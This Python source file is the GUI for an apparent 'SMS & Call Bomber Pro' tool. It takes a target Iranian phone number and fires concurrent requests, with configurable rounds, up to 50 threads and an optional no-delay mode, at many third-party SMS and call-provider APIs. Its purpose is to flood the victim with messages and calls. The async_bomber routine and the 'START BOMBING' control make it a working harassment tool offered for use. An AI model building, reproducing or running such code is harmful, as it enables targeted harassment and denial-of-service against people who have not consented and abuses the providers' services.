#!/usr/bin/env python3
"""
SMS & Call Bomber - CustomTkinter GUI
A beautiful, modern GUI using CustomTkinter library.
"""

import customtkinter as ctk
from tkinter import messagebox
import threading
import asyncio
import sys
import os
from datetime import datetime

# Add project path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from sms_bomber.api.providers import ProviderRegistry
from sms_bomber.api.call_providers import CallProviderRegistry
from sms_bomber.api.client import APIClient
from sms_bomber.api.call_client import CallBomberClient

# Configure CustomTkinter
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class StatsCard(ctk.CTkFrame):
    """A statistics card widget."""
    
    def __init__(self, parent, icon, value, label, color, **kwargs):
        super().__init__(parent, **kwargs)
        
        self.configure(fg_color="#1a1a2e", corner_radius=12)
        
        # Icon
        self.icon_label = ctk.CTkLabel(self, text=icon, font=("Segoe UI", 24))
        self.icon_label.pack(side="left", padx=(15, 10), pady=10)
        
        # Value and label frame
        text_frame = ctk.CTkFrame(self, fg_color="transparent")
        text_frame.pack(side="left", padx=(0, 15), pady=10)
        
        self.value_label = ctk.CTkLabel(text_frame, text=str(value), 
                                        font=("Segoe UI", 20, "bold"),
                                        text_color=color)
        self.value_label.pack(anchor="w")
        
        self.label = ctk.CTkLabel(text_frame, text=label,
                                  font=("Segoe UI", 11),
                                  text_color="#808090")
        self.label.pack(anchor="w")
        
    def set_value(self, value):
        self.value_label.configure(text=str(value))


class SMSBomberApp(ctk.CTk):
    """Main Application Window."""
    
    def __init__(self):
        super().__init__()
        
        # Window configuration
        self.title("⚡ SMS & Call Bomber Pro")
        self.geometry("950x720")
        self.minsize(850, 650)
        
        # Colors
        self.colors = {
            'bg': '#0d0d1a',
            'card': '#1a1a2e',
            'accent': '#6c5ce7',
            'accent_hover': '#7d6ff0',
            'accent2': '#00cec9',
            'accent3': '#fd79a8',
            'success': '#00e676',
            'error': '#ff5252',
            'warning': '#ffab00',
            'text': '#ffffff',
            'text_dim': '#808090'
        }
        
        self.configure(fg_color=self.colors['bg'])
        
        # State
        self.is_running = False
        self.stop_flag = False
        self.success_count = 0
        self.fail_count = 0
        
        # Registries
        self.sms_registry = ProviderRegistry()
        self.call_registry = CallProviderRegistry()
        
        # Build UI
        self.create_widgets()
        self.center_window()
        
    def center_window(self):
        """Center window on screen."""
        self.update_idletasks()
        w, h = self.winfo_width(), self.winfo_height()
        x = (self.winfo_screenwidth() // 2) - (w // 2)
        y = (self.winfo_screenheight() // 2) - (h // 2) - 30
        self.geometry(f"{w}x{h}+{x}+{y}")
        
    def create_widgets(self):
        """Create all widgets."""
        # Main container with padding
        self.main_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.main_frame.pack(fill="both", expand=True, padx=30, pady=25)
        
        # Header
        self.create_header()
        
        # Content - Two columns
        content = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        content.pack(fill="both", expand=True, pady=(20, 0))
        
        # Configure grid
        content.grid_columnconfigure(0, weight=1)
        content.grid_columnconfigure(1, weight=1)
        content.grid_rowconfigure(0, weight=1)
        
        # Left column
        left = ctk.CTkFrame(content, fg_color="transparent")
        left.grid(row=0, column=0, sticky="nsew", padx=(0, 15))
        
        self.create_input_card(left)
        self.create_options_card(left)
        self.create_buttons(left)
        
        # Right column
        right = ctk.CTkFrame(content, fg_color="transparent")
        right.grid(row=0, column=1, sticky="nsew", padx=(15, 0))
        
        self.create_progress_card(right)
        self.create_tools_card(right)
        self.create_log_card(right)
        
    def create_header(self):
        """Create header section."""
        header = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        header.pack(fill="x")
        
        # Left - Title
        title_frame = ctk.CTkFrame(header, fg_color="transparent")
        title_frame.pack(side="left")
        
        # Title row
        title_row = ctk.CTkFrame(title_frame, fg_color="transparent")
        title_row.pack(anchor="w")
        
        # Icon
        icon = ctk.CTkLabel(title_row, text="⚡", font=("Segoe UI", 36))
        icon.pack(side="left")
        
        # Title
        title = ctk.CTkLabel(title_row, text="SMS & Call Bomber",
                            font=("Segoe UI", 28, "bold"),
                            text_color=self.colors['text'])
        title.pack(side="left", padx=(8, 0))
        
        # Pro badge
        badge = ctk.CTkLabel(title_row, text=" PRO ",
                            font=("Segoe UI", 10, "bold"),
                            fg_color=self.colors['accent'],
                            corner_radius=6,
                            padx=8, pady=2)
        badge.pack(side="left", padx=(15, 0))
        
        # Subtitle
        subtitle = ctk.CTkLabel(title_frame,
                               text="Advanced Multi-Provider Bombing Tool",
                               font=("Segoe UI", 12),
                               text_color=self.colors['text_dim'])
        subtitle.pack(anchor="w", pady=(5, 0))
        
        # Right - Stats
        stats_frame = ctk.CTkFrame(header, fg_color="transparent")
        stats_frame.pack(side="right")
        
        sms_count = len(self.sms_registry.get_all_providers())
        call_count = len(self.call_registry.get_all_providers())
        
        # SMS card
        sms_card = StatsCard(stats_frame, "📨", sms_count, "SMS APIS", 
                            self.colors['accent2'])
        sms_card.pack(side="left", padx=(0, 10))
        
        # Call card
        call_card = StatsCard(stats_frame, "📞", call_count, "CALL APIS",
                             self.colors['accent3'])
        call_card.pack(side="left")
        
    def create_input_card(self, parent):
        """Create phone input card."""
        card = ctk.CTkFrame(parent, fg_color=self.colors['card'], corner_radius=15)
        card.pack(fill="x", pady=(0, 15))
        
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="x", padx=22, pady=20)
        
        # Header
        header = ctk.CTkFrame(inner, fg_color="transparent")
        header.pack(fill="x", pady=(0, 15))
        
        ctk.CTkLabel(header, text="📱", font=("Segoe UI", 22)).pack(side="left")
        ctk.CTkLabel(header, text="Target Phone Number",
                    font=("Segoe UI", 16, "bold")).pack(side="left", padx=(12, 0))
        
        # Phone entry
        self.phone_var = ctk.StringVar(value="09")
        self.phone_entry = ctk.CTkEntry(inner,
                                        textvariable=self.phone_var,
                                        font=("Segoe UI", 20),
                                        height=55,
                                        corner_radius=10,
                                        border_width=2,
                                        border_color="#3d3d5c",
                                        fg_color="#12121f",
                                        justify="center",
                                        placeholder_text="09123456789")
        self.phone_entry.pack(fill="x")
        self.phone_entry.bind("<Return>", lambda e: self.start_bombing())
        
        # Helper
        ctk.CTkLabel(inner, text="Enter Iranian phone number (e.g., 09123456789)",
                    font=("Segoe UI", 11),
                    text_color=self.colors['text_dim']).pack(anchor="w", pady=(10, 0))
                    
    def create_options_card(self, parent):
        """Create options card."""
        card = ctk.CTkFrame(parent, fg_color=self.colors['card'], corner_radius=15)
        card.pack(fill="x", pady=(0, 15))
        
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="x", padx=22, pady=20)
        
        # Header
        header = ctk.CTkFrame(inner, fg_color="transparent")
        header.pack(fill="x", pady=(0, 15))
        
        ctk.CTkLabel(header, text="⚙️", font=("Segoe UI", 22)).pack(side="left")
        ctk.CTkLabel(header, text="Options",
                    font=("Segoe UI", 16, "bold")).pack(side="left", padx=(12, 0))
        
        # Options row 1 - Spinners
        row1 = ctk.CTkFrame(inner, fg_color="transparent")
        row1.pack(fill="x", pady=(0, 15))
        
        # Rounds
        self.create_spinner(row1, "🔄 Rounds", "count_var", 1, 100, 1)
        # Threads
        self.create_spinner(row1, "🧵 Threads", "thread_var", 1, 50, 5)
        # Delay
        self.create_spinner(row1, "⏱️ Delay (s)", "delay_var", 0, 120, 20)
        
        # Mode selection
        mode_frame = ctk.CTkFrame(inner, fg_color="transparent")
        mode_frame.pack(fill="x", pady=(5, 10))
        
        ctk.CTkLabel(mode_frame, text="Mode:",
                    font=("Segoe UI", 12, "bold"),
                    text_color=self.colors['text_dim']).pack(side="left", padx=(0, 15))
        
        self.mode_var = ctk.StringVar(value="both")
        
        modes = [("📨 + 📞 Both", "both"), ("📨 SMS Only", "sms"), ("📞 Calls Only", "calls")]
        for text, value in modes:
            rb = ctk.CTkRadioButton(mode_frame, text=text,
                                   variable=self.mode_var, value=value,
                                   font=("Segoe UI", 12),
                                   fg_color=self.colors['accent'],
                                   hover_color=self.colors['accent_hover'])
            rb.pack(side="left", padx=(0, 20))
        
        # Checkboxes row
        check_frame = ctk.CTkFrame(inner, fg_color="transparent")
        check_frame.pack(fill="x", pady=(5, 0))
        
        self.no_delay_var = ctk.BooleanVar(value=False)
        cb1 = ctk.CTkCheckBox(check_frame, text="⚡ No delay between calls",
                             variable=self.no_delay_var,
                             font=("Segoe UI", 12),
                             fg_color=self.colors['accent'],
                             hover_color=self.colors['accent_hover'])
        cb1.pack(side="left", padx=(0, 25))
        
        self.verbose_var = ctk.BooleanVar(value=True)
        cb2 = ctk.CTkCheckBox(check_frame, text="📝 Verbose output",
                             variable=self.verbose_var,
                             font=("Segoe UI", 12),
                             fg_color=self.colors['accent'],
                             hover_color=self.colors['accent_hover'])
        cb2.pack(side="left")
        
    def create_spinner(self, parent, label, var_name, from_, to, default):
        """Create a labeled spinner."""
        frame = ctk.CTkFrame(parent, fg_color="transparent")
        frame.pack(side="left", fill="x", expand=True, padx=(0, 15))
        
        ctk.CTkLabel(frame, text=label, font=("Segoe UI", 11),
                    text_color=self.colors['text_dim']).pack(anchor="w")
        
        var = ctk.StringVar(value=str(default))
        setattr(self, var_name, var)
        
        # Entry with +/- buttons frame
        spin_frame = ctk.CTkFrame(frame, fg_color="#12121f", corner_radius=8)
        spin_frame.pack(fill="x", pady=(5, 0))
        
        entry = ctk.CTkEntry(spin_frame, textvariable=var,
                            font=("Segoe UI", 14),
                            width=80,
                            border_width=0,
                            fg_color="transparent",
                            justify="center")
        entry.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        
    def create_buttons(self, parent):
        """Create control buttons."""
        btn_frame = ctk.CTkFrame(parent, fg_color="transparent")
        btn_frame.pack(fill="x", pady=(5, 0))
        
        # Start button
        self.start_btn = ctk.CTkButton(btn_frame,
                                       text="🚀 START BOMBING",
                                       font=("Segoe UI", 14, "bold"),
                                       height=50,
                                       corner_radius=12,
                                       fg_color=self.colors['accent'],
                                       hover_color=self.colors['accent_hover'],
                                       command=self.start_bombing)
        self.start_btn.pack(side="left", padx=(0, 12))
        
        # Stop button
        self.stop_btn = ctk.CTkButton(btn_frame,
                                      text="⏹ STOP",
                                      font=("Segoe UI", 14, "bold"),
                                      height=50,
                                      width=120,
                                      corner_radius=12,
                                      fg_color=self.colors['error'],
                                      hover_color="#ff7777",
                                      state="disabled",
                                      command=self.stop_bombing)
        self.stop_btn.pack(side="left")
        
    def create_progress_card(self, parent):
        """Create progress card."""
        card = ctk.CTkFrame(parent, fg_color=self.colors['card'], corner_radius=15)
        card.pack(fill="x", pady=(0, 15))
        
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="x", padx=22, pady=20)
        
        # Header
        header = ctk.CTkFrame(inner, fg_color="transparent")
        header.pack(fill="x", pady=(0, 15))
        
        ctk.CTkLabel(header, text="📊", font=("Segoe UI", 22)).pack(side="left")
        ctk.CTkLabel(header, text="Progress",
                    font=("Segoe UI", 16, "bold")).pack(side="left", padx=(12, 0))
        
        # Progress bar
        self.progress_bar = ctk.CTkProgressBar(inner, height=14, corner_radius=7,
                                               fg_color="#12121f",
                                               progress_color=self.colors['accent'])
        self.progress_bar.pack(fill="x", pady=(0, 10))
        self.progress_bar.set(0)
        
        # Progress label
        self.progress_label = ctk.CTkLabel(inner, text="Ready to start",
                                          font=("Segoe UI", 12),
                                          text_color=self.colors['text_dim'])
        self.progress_label.pack(anchor="w")
        
        # Stats row
        stats_row = ctk.CTkFrame(inner, fg_color="transparent")
        stats_row.pack(fill="x", pady=(15, 0))
        
        # Success
        success_frame = ctk.CTkFrame(stats_row, fg_color="#12121f", corner_radius=10)
        success_frame.pack(side="left", fill="x", expand=True, padx=(0, 8))
        
        success_inner = ctk.CTkFrame(success_frame, fg_color="transparent")
        success_inner.pack(pady=12)
        
        self.success_label = ctk.CTkLabel(success_inner, text="0",
                                         font=("Segoe UI", 26, "bold"),
                                         text_color=self.colors['success'])
        self.success_label.pack()
        ctk.CTkLabel(success_inner, text="SUCCESS",
                    font=("Segoe UI", 10),
                    text_color=self.colors['text_dim']).pack()
        
        # Failed
        fail_frame = ctk.CTkFrame(stats_row, fg_color="#12121f", corner_radius=10)
        fail_frame.pack(side="left", fill="x", expand=True, padx=(8, 0))
        
        fail_inner = ctk.CTkFrame(fail_frame, fg_color="transparent")
        fail_inner.pack(pady=12)
        
        self.fail_label = ctk.CTkLabel(fail_inner, text="0",
                                       font=("Segoe UI", 26, "bold"),
                                       text_color=self.colors['error'])
        self.fail_label.pack()
        ctk.CTkLabel(fail_inner, text="FAILED",
                    font=("Segoe UI", 10),
                    text_color=self.colors['text_dim']).pack()
                    
    def create_tools_card(self, parent):
        """Create tools section card."""
        card = ctk.CTkFrame(parent, fg_color=self.colors['card'], corner_radius=15)
        card.pack(fill="x", pady=(0, 15))
        
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="x", padx=22, pady=20)
        
        # Header
        header = ctk.CTkFrame(inner, fg_color="transparent")
        header.pack(fill="x", pady=(0, 15))
        
        ctk.CTkLabel(header, text="🛠️", font=("Segoe UI", 22)).pack(side="left")
        ctk.CTkLabel(header, text="Tools",
                    font=("Segoe UI", 16, "bold")).pack(side="left", padx=(12, 0))
        
        # Tools grid - 2 rows
        tools_row1 = ctk.CTkFrame(inner, fg_color="transparent")
        tools_row1.pack(fill="x", pady=(0, 8))
        
        tools_row2 = ctk.CTkFrame(inner, fg_color="transparent")
        tools_row2.pack(fill="x")
        
        # Row 1 buttons
        # Test Providers
        test_btn = ctk.CTkButton(tools_row1, 
                                text="🔍 Test Providers",
                                font=("Segoe UI", 11),
                                height=36,
                                corner_radius=8,
                                fg_color="#3d3d5c",
                                hover_color="#4d4d6c",
                                command=self.test_providers)
        test_btn.pack(side="left", fill="x", expand=True, padx=(0, 6))
        
        # Export Log
        export_btn = ctk.CTkButton(tools_row1,
                                  text="📄 Export Log",
                                  font=("Segoe UI", 11),
                                  height=36,
                                  corner_radius=8,
                                  fg_color="#3d3d5c",
                                  hover_color="#4d4d6c",
                                  command=self.export_log)
        export_btn.pack(side="left", fill="x", expand=True, padx=(6, 0))
        
        # Row 2 buttons
        # Provider Info
        info_btn = ctk.CTkButton(tools_row2,
                                text="📊 Provider Stats",
                                font=("Segoe UI", 11),
                                height=36,
                                corner_radius=8,
                                fg_color="#3d3d5c",
                                hover_color="#4d4d6c",
                                command=self.show_provider_stats)
        info_btn.pack(side="left", fill="x", expand=True, padx=(0, 6))
        
        # Quick Test - Send single test request
        quick_test_btn = ctk.CTkButton(tools_row2,
                                 text="🧪 Quick Test",
                                 font=("Segoe UI", 11),
                                 height=36,
                                 corner_radius=8,
                                 fg_color="#3d3d5c",
                                 hover_color="#4d4d6c",
                                 command=self.quick_test)
        quick_test_btn.pack(side="left", fill="x", expand=True, padx=(6, 0))
        
    def test_providers(self):
        """Test all providers connectivity."""
        self.log("━" * 40, 'dim')
        self.log("🔍 Testing provider connectivity...", 'warning')
        
        sms_count = len(self.sms_registry.get_all_providers())
        call_count = len(self.call_registry.get_all_providers())
        
        self.log(f"📨 SMS Providers loaded: {sms_count}", 'sms')
        self.log(f"📞 Call Providers loaded: {call_count}", 'call')
        self.log(f"✅ Total: {sms_count + call_count} providers ready", 'success')
        self.log("━" * 40, 'dim')
        
    def export_log(self):
        """Export log to file."""
        from tkinter import filedialog
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("Log files", "*.log"), ("All files", "*.*")],
            initialfile=f"bomber_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        if filename:
            try:
                log_content = self.log_text.get("1.0", "end")
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(log_content)
                self.log(f"📄 Log exported to: {filename}", 'success')
            except Exception as e:
                self.log(f"❌ Export failed: {str(e)}", 'error')
                
    def show_provider_stats(self):
        """Show detailed provider statistics."""
        sms_providers = self.sms_registry.get_all_providers()
        call_providers = self.call_registry.get_all_providers()
        
        self.log("━" * 40, 'dim')
        self.log("📊 PROVIDER STATISTICS", 'warning')
        self.log("━" * 40, 'dim')
        
        self.log(f"\n📨 SMS PROVIDERS ({len(sms_providers)}):", 'sms')
        for i, p in enumerate(sms_providers[:10], 1):
            self.log(f"   {i}. {p.name}", 'info')
        if len(sms_providers) > 10:
            self.log(f"   ... and {len(sms_providers) - 10} more", 'dim')
            
        self.log(f"\n📞 CALL PROVIDERS ({len(call_providers)}):", 'call')
        for i, p in enumerate(call_providers[:10], 1):
            self.log(f"   {i}. {p.name}", 'info')
        if len(call_providers) > 10:
            self.log(f"   ... and {len(call_providers) - 10} more", 'dim')
            
        self.log("━" * 40, 'dim')
        
    def quick_test(self):
        """Send a quick test request to verify connectivity."""
        phone = self.phone_var.get().strip()
        
        if not phone or phone == "09" or len(phone) < 10:
            messagebox.showwarning("Warning", "Please enter a valid phone number first")
            return
            
        self.log("━" * 40, 'dim')
        self.log("🧪 Running quick connectivity test...", 'warning')
        
        # Run test in background thread
        def run_test():
            import asyncio
            asyncio.run(self._async_quick_test(phone))
            
        thread = threading.Thread(target=run_test, daemon=True)
        thread.start()
        
    async def _async_quick_test(self, phone):
        """Async quick test."""
        import random
        
        sms_providers = self.sms_registry.get_all_providers()
        
        if not sms_providers:
            self.after(0, lambda: self.log("❌ No SMS providers available", 'error'))
            return
            
        # Pick a random provider
        provider = random.choice(sms_providers)
        
        self.after(0, lambda: self.log(f"📨 Testing: {provider.name}", 'sms'))
        
        try:
            client = APIClient(timeout=5.0)
            data = provider.get_request_data(phone)
            url = provider.get_formatted_url(phone)
            content_type = getattr(provider, 'content_type', 'json')
            method = getattr(provider, 'method', 'POST')
            
            result = await client.send_request(provider.name, url, data, content_type, method)
            await client.close()
            
            if result.get('success'):
                self.after(0, lambda: self.log(f"✅ Test PASSED - {provider.name} is working!", 'success'))
            else:
                error = result.get('error', 'Unknown error')[:50]
                self.after(0, lambda: self.log(f"⚠️ Test completed with error: {error}", 'warning'))
        except Exception as e:
            self.after(0, lambda: self.log(f"❌ Test FAILED: {str(e)}", 'error'))
            
        self.after(0, lambda: self.log("━" * 40, 'dim'))
                    
    def create_log_card(self, parent):
        """Create log output card."""
        card = ctk.CTkFrame(parent, fg_color=self.colors['card'], corner_radius=15)
        card.pack(fill="both", expand=True)
        
        inner = ctk.CTkFrame(card, fg_color="transparent")
        inner.pack(fill="both", expand=True, padx=22, pady=20)
        
        # Header
        header = ctk.CTkFrame(inner, fg_color="transparent")
        header.pack(fill="x", pady=(0, 12))
        
        ctk.CTkLabel(header, text="📋", font=("Segoe UI", 22)).pack(side="left")
        ctk.CTkLabel(header, text="Activity Log",
                    font=("Segoe UI", 16, "bold")).pack(side="left", padx=(12, 0))
        
        # Clear button
        clear_btn = ctk.CTkButton(header, text="🗑️ Clear",
                                 font=("Segoe UI", 11),
                                 width=80, height=30,
                                 corner_radius=8,
                                 fg_color="#3d3d5c",
                                 hover_color="#4d4d6c",
                                 command=self.clear_log)
        clear_btn.pack(side="right")
        
        # Log textbox
        self.log_text = ctk.CTkTextbox(inner,
                                       font=("Cascadia Code", 11),
                                       fg_color="#0a0a14",
                                       text_color=self.colors['success'],
                                       corner_radius=10,
                                       border_width=0)
        self.log_text.pack(fill="both", expand=True)
        
        # Configure tags
        self.log_text.tag_config('success', foreground=self.colors['success'])
        self.log_text.tag_config('error', foreground=self.colors['error'])
        self.log_text.tag_config('warning', foreground=self.colors['warning'])
        self.log_text.tag_config('info', foreground='#70a1ff')
        self.log_text.tag_config('sms', foreground=self.colors['accent2'])
        self.log_text.tag_config('call', foreground=self.colors['accent3'])
        self.log_text.tag_config('dim', foreground=self.colors['text_dim'])
        
    def log(self, message, tag='info'):
        """Add message to log."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert("end", f"[{timestamp}] ", 'dim')
        self.log_text.insert("end", message + "\n", tag)
        self.log_text.see("end")
        
    def clear_log(self):
        """Clear log output."""
        self.log_text.delete("1.0", "end")
        self.success_count = 0
        self.fail_count = 0
        self.update_stats()
        
    def update_stats(self):
        """Update stats display."""
        self.success_label.configure(text=str(self.success_count))
        self.fail_label.configure(text=str(self.fail_count))
        
    def validate_input(self):
        """Validate phone input."""
        phone = self.phone_var.get().strip()
        
        if not phone or phone == "09":
            messagebox.showerror("Error", "Please enter a phone number")
            return False
            
        if not phone.isdigit():
            messagebox.showerror("Error", "Phone number must contain only digits")
            return False
            
        if len(phone) < 10 or len(phone) > 12:
            return messagebox.askyesno("Warning", 
                                       "Phone number seems unusual.\nContinue anyway?")
        return True
        
    def start_bombing(self):
        """Start bombing."""
        if not self.validate_input():
            return
            
        self.is_running = True
        self.stop_flag = False
        self.success_count = 0
        self.fail_count = 0
        self.update_stats()
        
        # Update UI
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.phone_entry.configure(state="disabled")
        self.progress_bar.set(0)
        
        self.log("━" * 40, 'dim')
        self.log("🚀 Starting SMS & Call Bomber", 'warning')
        self.log(f"📱 Target: {self.phone_var.get()}", 'info')
        self.log(f"🔄 Rounds: {self.count_var.get()} | 🧵 Threads: {self.thread_var.get()}", 'info')
        self.log("━" * 40, 'dim')
        
        # Start thread
        thread = threading.Thread(target=self.run_bomber, daemon=True)
        thread.start()
        
    def stop_bombing(self):
        """Stop bombing."""
        self.stop_flag = True
        self.log("⏹ Stopping...", 'warning')
        
    def run_bomber(self):
        """Run bomber in background."""
        try:
            asyncio.run(self.async_bomber())
        except Exception as e:
            error_msg = str(e)
            self.after(0, lambda msg=error_msg: self.log(f"❌ Error: {msg}", 'error'))
        finally:
            self.after(0, self.bombing_complete)
            
    async def async_bomber(self):
        """Async bomber."""
        phone = self.phone_var.get().strip()
        count = int(self.count_var.get())
        threads = int(self.thread_var.get())
        call_delay = int(self.delay_var.get())
        no_delay = self.no_delay_var.get()
        mode = self.mode_var.get()
        
        sms_providers = [] if mode == "calls" else self.sms_registry.get_all_providers()
        call_providers = [] if mode == "sms" else self.call_registry.get_all_providers()
        
        total = (len(sms_providers) + len(call_providers)) * count
        completed = 0
        
        self.after(0, lambda: self.log(f"📨 SMS: {len(sms_providers)} | 📞 Calls: {len(call_providers)}", 'info'))
        
        sms_client = APIClient(timeout=3.0)
        call_client = CallBomberClient(timeout=5.0)
        semaphore = asyncio.Semaphore(threads)
        
        async def process_sms(provider):
            nonlocal completed
            if self.stop_flag:
                return
            async with semaphore:
                try:
                    data = provider.get_request_data(phone)
                    url = provider.get_formatted_url(phone)
                    content_type = getattr(provider, 'content_type', 'json')
                    method = getattr(provider, 'method', 'POST')
                    result = await sms_client.send_request(provider.name, url, data, content_type, method)
                    
                    completed += 1
                    progress = completed / total
                    
                    if result.get('success'):
                        self.success_count += 1
                        msg, tag = f"✓ [SMS] {provider.name}", 'success'
                    else:
                        self.fail_count += 1
                        msg, tag = f"✗ [SMS] {provider.name}", 'error'
                    
                    self.after(0, lambda m=msg, t=tag, p=progress: self.update_progress(m, t, p))
                except:
                    self.fail_count += 1
                    completed += 1
                    
        async def process_call(provider):
            nonlocal completed
            if self.stop_flag:
                return
            try:
                data = provider.get_request_data(phone)
                url = provider.get_formatted_url(phone)
                result = await call_client.send_call_request(provider.name, url, data)
                
                completed += 1
                progress = completed / total
                
                if result.get('success'):
                    self.success_count += 1
                    msg, tag = f"✓ [CALL] {provider.name}", 'success'
                else:
                    self.fail_count += 1
                    msg, tag = f"✗ [CALL] {provider.name}", 'error'
                
                self.after(0, lambda m=msg, t=tag, p=progress: self.update_progress(m, t, p))
            except:
                self.fail_count += 1
                completed += 1
                
        # SMS
        if sms_providers and not self.stop_flag:
            self.after(0, lambda: self.log("\n📨 Processing SMS...", 'sms'))
            tasks = [process_sms(p) for _ in range(count) for p in sms_providers]
            await asyncio.gather(*tasks)
            
        # Calls
        if call_providers and not self.stop_flag:
            self.after(0, lambda: self.log("\n📞 Processing Calls...", 'call'))
            if no_delay:
                tasks = [process_call(p) for _ in range(count) for p in call_providers]
                await asyncio.gather(*tasks)
            else:
                for r in range(count):
                    for i, p in enumerate(call_providers):
                        if self.stop_flag:
                            break
                        if r > 0 or i > 0:
                            for remaining in range(call_delay, 0, -1):
                                if self.stop_flag:
                                    break
                                self.after(0, lambda x=remaining: 
                                    self.progress_label.configure(text=f"⏱️ Next call in {x}s..."))
                                await asyncio.sleep(1)
                        await process_call(p)
                        
        await sms_client.close()
        await call_client.close()
        
    def update_progress(self, message, tag, progress):
        """Update progress."""
        if self.verbose_var.get():
            self.log(message, tag)
        self.progress_bar.set(progress)
        self.progress_label.configure(text=f"Progress: {progress*100:.1f}%")
        self.update_stats()
        
    def bombing_complete(self):
        """Bombing complete callback."""
        self.is_running = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.phone_entry.configure(state="normal")
        
        if self.stop_flag:
            self.log("\n⏹ Stopped by user", 'warning')
        else:
            self.log("\n✅ Completed!", 'success')
            
        total = self.success_count + self.fail_count
        rate = (self.success_count / total * 100) if total > 0 else 0
        self.log(f"📊 {self.success_count} success, {self.fail_count} failed ({rate:.1f}%)", 'info')
        self.progress_label.configure(text="Completed")
        self.progress_bar.set(1)


def main():
    app = SMSBomberApp()
    app.mainloop()


if __name__ == "__main__":
    main()
